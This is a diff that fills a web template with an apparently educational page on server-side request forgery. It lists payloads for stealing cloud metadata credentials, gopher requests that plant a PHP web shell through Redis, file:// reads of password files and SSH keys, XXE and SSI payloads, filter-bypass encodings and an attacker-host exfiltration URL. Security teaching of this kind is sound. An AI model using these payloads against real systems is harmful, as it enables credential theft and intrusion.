@@ -215,7 +215,468 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>API07: Server Side Request Forgery - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding-ssrf-attack-vectors">Understanding SSRF Attack Vectors</a></li>
+<li><a href="#common-attack-patterns">Common Attack Patterns</a></li>
+<li><a href="#cloud-metadata-exploitation">Cloud Metadata Exploitation</a></li>
+<li><a href="#internal-network-access">Internal Network Access</a></li>
+<li><a href="#ssrf-bypass-techniques">SSRF Bypass Techniques</a></li>
+</ul>
+
+<h2>Understanding SSRF Attack Vectors</h2>
+
+<p>> <strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong></p>
+
+<p>SSRF exploits occur when attackers can control URLs that servers fetch, allowing them to:</p>
+<ul>
+<li>Access internal services not exposed to the internet</li>
+<li>Read cloud metadata containing credentials</li>
+<li>Scan internal networks</li>
+<li>Access file systems</li>
+<li>Bypass firewalls and access controls</li>
+</ul>
+
+<h3>Core Attack Flow</h3>
+
+<p>``<code></p>
+<ol>
+<li>Discover URL Input</li>
+</ol>
+<p>   ↓</p>
+<p>   Find parameters accepting URLs (webhooks, imports, images)</p>
+
+<ol>
+<li>Test for SSRF</li>
+</ol>
+<p>   ↓</p>
+<p>   Submit internal URLs (localhost, 169.254.169.254)</p>
+   
+<ol>
+<li>Exploit</li>
+</ol>
+<p>   ↓</p>
+<p>   Access metadata, internal services, files</p>
+   
+<ol>
+<li>Escalate</li>
+</ol>
+<p>   ↓</p>
+<p>   Use stolen credentials for further access</p>
+</code>`<code>
+
+<h2>Common Attack Patterns</h2>
+
+<h3>1. AWS Metadata Service Exploitation</h3>
+
+<strong>Target</strong>: http://169.254.169.254/latest/meta-data/
+
+<strong>Attack Flow</strong>:
+</code>`<code>
+<ol>
+<li>Test basic access:</li>
+</ol>
+<p>   http://169.254.169.254/latest/meta-data/</p>
+
+<ol>
+<li>Enumerate IAM roles:</li>
+</ol>
+<p>   http://169.254.169.254/latest/meta-data/iam/security-credentials/</p>
+
+<ol>
+<li>Extract credentials:</li>
+</ol>
+<p>   http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]</p>
+   
+<ol>
+<li>Response contains:</li>
+<ul>
+<li>AccessKeyId</li>
+<li>SecretAccessKey</li>
+<li>Token</li>
+</ul>
+</ol>
+</code>`<code>
+
+<strong>Real Attack Example</strong>:
+</code>`<code>http
+<p>POST /api/import-data</p>
+<p>{</p>
+<p>  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"</p>
+<p>}</p>
+
+<p>Response: ["ec2-role-name"]</p>
+
+<p>POST /api/import-data</p>
+<p>{</p>
+<p>  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"</p>
+<p>}</p>
+
+<p>Response:</p>
+<p>{</p>
+<p>  "AccessKeyId": "ASIA...",</p>
+<p>  "SecretAccessKey": "...",</p>
+<p>  "Token": "..."</p>
+<p>}</p>
+</code>`<code>
+
+<h3>2. Azure Metadata Exploitation</h3>
+
+<strong>Target</strong>: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+<strong>Required Header</strong>: </code>Metadata: true<code>
+
+<strong>Attack</strong>:
+</code>`<code>http
+<p>GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/</p>
+
+<p>Response:</p>
+<p>{</p>
+<p>  "access_token": "eyJ0eXAi...",</p>
+<p>  "expires_in": "3599",</p>
+<p>  "resource": "https://management.azure.com/",</p>
+<p>  "token_type": "Bearer"</p>
+<p>}</p>
+</code>`<code>
+
+<h3>3. GCP Metadata Exploitation</h3>
+
+<strong>Target</strong>: http://metadata.google.internal/computeMetadata/v1/
+
+<strong>Required Header</strong>: </code>Metadata-Flavor: Google<code>
+
+<strong>Attack Endpoints</strong>:
+</code>`<code>
+<p>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</p>
+<p>http://metadata.google.internal/computeMetadata/v1/project/project-id</p>
+<p>http://metadata.google.internal/computeMetadata/v1/instance/attributes/</p>
+</code>`<code>
+
+<h3>4. Internal Service Scanning</h3>
+
+<strong>Port Scanning</strong>:
+</code>`<code>
+<p>http://192.168.1.1:22    (SSH)</p>
+<p>http://192.168.1.1:3306  (MySQL)</p>
+<p>http://192.168.1.1:6379  (Redis)</p>
+<p>http://192.168.1.1:8080  (Jenkins)</p>
+<p>http://192.168.1.1:9200  (Elasticsearch)</p>
+</code>`<code>
+
+<strong>Service Enumeration</strong>:
+<ul>
+<li>Test common ports</li>
+<li>Identify running services</li>
+<li>Find admin interfaces</li>
+<li>Locate databases</li>
+</ul>
+
+<h3>5. Redis Exploitation via SSRF</h3>
+
+<strong>Attack</strong>:
+</code>`<code>
+<p>http://localhost:6379/</p>
+</code>`<code>
+
+<strong>Commands via URL</strong>:
+<p>Using gopher protocol:</p>
+</code>`<code>
+<p>gopher://localhost:6379/_SET%20admin%20true</p>
+<p>gopher://localhost:6379/_CONFIG%20SET%20dir%20/var/www/html</p>
+<p>gopher://localhost:6379/_CONFIG%20SET%20dbfilename%20shell.php</p>
+<p>gopher://localhost:6379/_SET%20payload%20"<?php%20system($_GET['cmd']);%20?>"</p>
+<p>gopher://localhost:6379/_SAVE</p>
+</code>`<code>
+
+<h3>6. File System Access</h3>
+
+<strong>File Protocol</strong>:
+</code>`<code>
+<p>file:///etc/passwd</p>
+<p>file:///proc/self/environ</p>
+<p>file:///var/www/html/config.php</p>
+<p>file://C:/Windows/win.ini</p>
+</code>`<code>
+
+<strong>Sensitive Files</strong>:
+<ul>
+<li></code>/etc/passwd<code>, </code>/etc/shadow<code></li>
+<li></code>/proc/self/environ<code> (environment variables)</li>
+<li></code>~/.ssh/id_rsa<code> (SSH keys)</li>
+<li></code>/var/www/html/.env<code> (application secrets)</li>
+<li></code>C:/inetpub/wwwroot/web.config<code></li>
+</ul>
+
+<h3>7. Webhook Abuse</h3>
+
+<strong>Attack</strong>:
+</code>`<code>http
+<p>POST /api/webhook/register</p>
+<p>{</p>
+<p>  "callback_url": "http://internal-admin:8080/api/delete-all-data"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Impact</strong>:
+<ul>
+<li>Trigger internal actions</li>
+<li>CSRF on internal systems</li>
+<li>Data manipulation</li>
+<li>Service disruption</li>
+</ul>
+
+<h3>8. PDF/HTML Rendering SSRF</h3>
+
+<strong>Attack</strong>:
+</code>`<code>http
+<p>POST /api/generate-pdf</p>
+<p>{</p>
+<p>  "html": "<img src='http://169.254.169.254/latest/meta-data/'>"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Also works with</strong>:
+<ul>
+<li></code><iframe><code></li>
+<li></code><object><code></li>
+<li></code><embed><code></li>
+<li></code><link rel='stylesheet'><code></li>
+<li></code><script src=''><code></li>
+</ul>
+
+<h3>9. XML External Entity (XXE) to SSRF</h3>
+
+<strong>Attack</strong>:
+</code>`<code>xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+<p>]></p>
+<root>
+  <data>&xxe;</data>
+</root>
+</code>`<code>
+
+<h3>10. DNS Rebinding Attack</h3>
+
+<strong>Technique</strong>: Change DNS resolution mid-request
+
+<strong>Attack Flow</strong>:
+<ol>
+<li>Create domain: attacker.com</li>
+<li>Initial DNS lookup: Returns 1.2.3.4 (public IP) - passes validation</li>
+<li>After validation, DNS changes to: 169.254.169.254</li>
+<li>Server fetches from metadata service</li>
+</ol>
+
+<h3>11. URL Redirect Chains</h3>
+
+<strong>Bypass IP blacklists</strong>:
+</code>`<code>
+<p>https://attacker.com/redirect</p>
+<p>  ↓ (301 redirect)</p>
+<p>http://169.254.169.254/latest/meta-data/</p>
+</code>`<code>
+
+<strong>Server follows redirect without re-validating destination</strong>
+
+<h3>12. IP Address Obfuscation</h3>
+
+<strong>Bypass Techniques</strong>:
+</code>`<code>
+<p>Decimal: http://2852039166/        (169.254.169.254)</p>
+<p>Octal:   http://0251.0376.0251.0376/</p>
+<p>Hex:     http://0xa9.0xfe.0xa9.0xfe/</p>
+<p>Mixed:   http://0xa9.254.169.254/</p>
+<p>Short:   http://169.254.169.254 → http://169.254.43518</p>
+<p>IPv6:    http://[::ffff:a9fe:a9fe]/</p>
+</code>`<code>
+
+<h3>13. CRLF Injection in URLs</h3>
+
+<strong>Inject headers</strong>:
+</code>`<code>
+<p>http://example.com%0d%0aHost:%20169.254.169.254%0d%0a</p>
+</code>`<code>
+
+<strong>Result</strong>: Override Host header to target metadata
+
+<h3>14. Time-Based Blind SSRF</h3>
+
+<strong>Detection when response not returned</strong>:
+</code>`<code>python
+<h1>Test if server can reach target</h1>
+<p>url1 = "http://169.254.169.254/"  # Fast response if accessible</p>
+<p>url2 = "http://192.168.1.1:12345/"  # Timeout if not accessible</p>
+
+<h1>Measure response time to detect accessibility</h1>
+</code>`<code>
+
+<h3>15. Cloud Storage Access</h3>
+
+<strong>AWS S3</strong>:
+</code>`<code>
+<p>http://s3.amazonaws.com/internal-bucket/secrets.txt</p>
+<p>http://internal-bucket.s3.amazonaws.com/config.json</p>
+</code>`<code>
+
+<strong>Azure Blob</strong>:
+</code>`<code>
+<p>http://storageaccount.blob.core.windows.net/container/secret.txt</p>
+</code>`<code>
+
+<h3>16. Service Account Token Theft</h3>
+
+<strong>Kubernetes</strong>:
+</code>`<code>
+<p>http://localhost:10255/metrics</p>
+<p>http://localhost:10255/pods</p>
+<p>file:///var/run/secrets/kubernetes.io/serviceaccount/token</p>
+</code>`<code>
+
+<strong>Docker</strong>:
+</code>`<code>
+<p>http://localhost:2375/containers/json</p>
+<p>http://localhost:2375/images/json</p>
+</code>`<code>
+
+<h3>17. LDAP/SMTP/FTP via SSRF</h3>
+
+<strong>LDAP Injection</strong>:
+</code>`<code>
+<p>ldap://localhost:389/dc=example,dc=com</p>
+</code>`<code>
+
+<strong>SMTP Enumeration</strong>:
+</code>`<code>
+<p>smtp://localhost:25/</p>
+</code>`<code>
+
+<strong>FTP Data Exfiltration</strong>:
+</code>`<code>
+<p>ftp://attacker.com:21/</p>
+</code>`<code>
+
+<h3>18. WebSocket SSRF</h3>
+
+<strong>Attack</strong>:
+</code>`<code>javascript
+<p>ws://internal-service:8080/websocket</p>
+</code>`<code>
+
+<h3>19. Localhost Variations</h3>
+
+<strong>Bypass localhost blocks</strong>:
+</code>`<code>
+<p>http://127.0.0.1/</p>
+<p>http://localhost/</p>
+<p>http://0.0.0.0/</p>
+<p>http://[::1]/</p>
+<p>http://[::]</p>
+<p>http://127.1/</p>
+<p>http://127.0.1/</p>
+<p>http://2130706433/  (decimal)</p>
+</code>`<code>
+
+<h3>20. Server-Side Include (SSI) SSRF</h3>
+
+<strong>Attack</strong>:
+</code>`<code>html
+<!--#include virtual="http://169.254.169.254/latest/meta-data/" -->
+</code>`<code>
+
+<h2>SSRF Bypass Techniques</h2>
+
+<h3>URL Parser Confusion</h3>
+
+<strong>Exploit differences in URL parsing</strong>:
+</code>`<code>
+<p>http://attacker.com@169.254.169.254/</p>
+<p>http://169.254.169.254#@attacker.com/</p>
+<p>http://169.254.169.254%00.attacker.com/</p>
+</code>`<code>
+
+<h3>Protocol Smuggling</h3>
+
+<strong>Mix protocols</strong>:
+</code>`<code>
+<p>http://localhost:11211/set%20test%200%200%205%0d%0aABCDE  (Memcached)</p>
+<p>dict://localhost:6379/INFO  (Redis)</p>
+<p>gopher://localhost:3306/... (MySQL)</p>
+</code>`<code>
+
+<h3>Charset Encoding</h3>
+
+<strong>Unicode characters</strong>:
+</code>`<code>
+<p>http://169.254.169.254/    (normal)</p>
+<p>http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/  (unicode)</p>
+</code>`<code>
+
+<h2>Cloud Provider-Specific Attacks</h2>
+
+<h3>AWS</h3>
+
+<strong>IMDSv1 (easy to exploit)</strong>:
+</code>`<code>
+<p>http://169.254.169.254/latest/meta-data/</p>
+</code>`<code>
+
+<strong>IMDSv2 (requires token)</strong>:
+</code>`<code>
+<ol>
+<li>Get token:</li>
+</ol>
+<p>   PUT http://169.254.169.254/latest/api/token</p>
+<p>   X-aws-ec2-metadata-token-ttl-seconds: 21600</p>
+   
+<ol>
+<li>Use token:</li>
+</ol>
+<p>   GET http://169.254.169.254/latest/meta-data/</p>
+<p>   X-aws-ec2-metadata-token: [TOKEN]</p>
+</code>`<code>
+
+<h3>Azure</h3>
+
+<strong>Requires Metadata header</strong>:
+</code>`<code>
+<p>GET http://169.254.169.254/metadata/instance?api-version=2021-02-01</p>
+<p>Metadata: true</p>
+</code>`<code>
+
+<strong>Bypass</strong>: Some vulnerable apps copy headers from user requests
+
+<h3>GCP</h3>
+
+<strong>Requires Metadata-Flavor header</strong>:
+</code>`<code>
+<p>GET http://metadata.google.internal/computeMetadata/v1/</p>
+<p>Metadata-Flavor: Google</p>
+</code>``
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>SSRF allows server-side requests to anywhere</strong> attacker specifies</li>
+<li><strong>Cloud metadata is #1 target</strong> - contains powerful credentials</li>
+<li><strong>Many bypass techniques exist</strong> - simple blacklists insufficient</li>
+<li><strong>Protocol diversity</strong> - not just HTTP (gopher, file, dict, etc.)</li>
+<li><strong>Chain with other vulns</strong> - XXE, open redirects, CRLF injection</li>
+<li><strong>Time-based detection</strong> - even without visible response</li>
+<li><strong>Internal network access</strong> - bypass firewalls and network segmentation</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.md">Prevention Guide</a></strong>: Learn comprehensive SSRF defenses</li>
+<li><strong><a href="examples.md">Code Examples</a></strong>: See secure implementations</li>
+<li><strong><a href="lab/api07-ssrf-lab/">Hands-On Lab</a></strong>: Practice SSRF exploitation and prevention</li>
+</ul>
+
         </div>
     </div>
 </body>
